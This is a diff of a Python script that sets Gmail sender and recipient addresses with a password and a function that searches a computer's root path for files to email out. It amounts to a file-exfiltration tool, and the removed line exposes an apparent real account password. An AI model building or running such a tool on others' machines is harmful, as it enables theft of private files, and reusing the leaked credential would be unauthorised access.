@@ -9,14 +9,8 @@ starttime = time.time()
 # Email Variables - Needed to specificy contents of email
 
 fromaddr = "16636362dhwhba.cieuwya@gmail.com" # Enter the email you wish to send the data from. i put a random gmail address i created for demonstration purposes, remember that if you decide to use this one i can see all the emails you send and the location from where youve logged in from
-frompassword = "Manwoods61732" # Enter the password from the email here
+frompassword = "TEMPTESTEMAIL123" # Enter the password from the email here
 toaddr = "temptestemailforprogram@gmail.com" # Enter the email you wish to receive the data on
-
-msg = email()
-msg['From'] = fromaddr
-msg['To'] = toaddr
-msg['Subject'] = "File"
-
 
 # Functions - Serve different purposes
 def findfile(name, extensions, path):
@@ -37,7 +31,7 @@ def findfile(name, extensions, path):
 #   - Enter extension you want to search for. please enter it as a list, wether or not you want more than one type of file
 #   - Leave the extension as a blank list if you want all file types
 #   - Then for the thrid paramter add the root path you want to start searching from
-#   - For the whole computer, put "/", but for demonstration purposes i put "/Users"
+#   - For the whole computer, put "/" for mac or "\" for windows
 #     as it is where most people store their files, and there is not point looking through system files
 
 
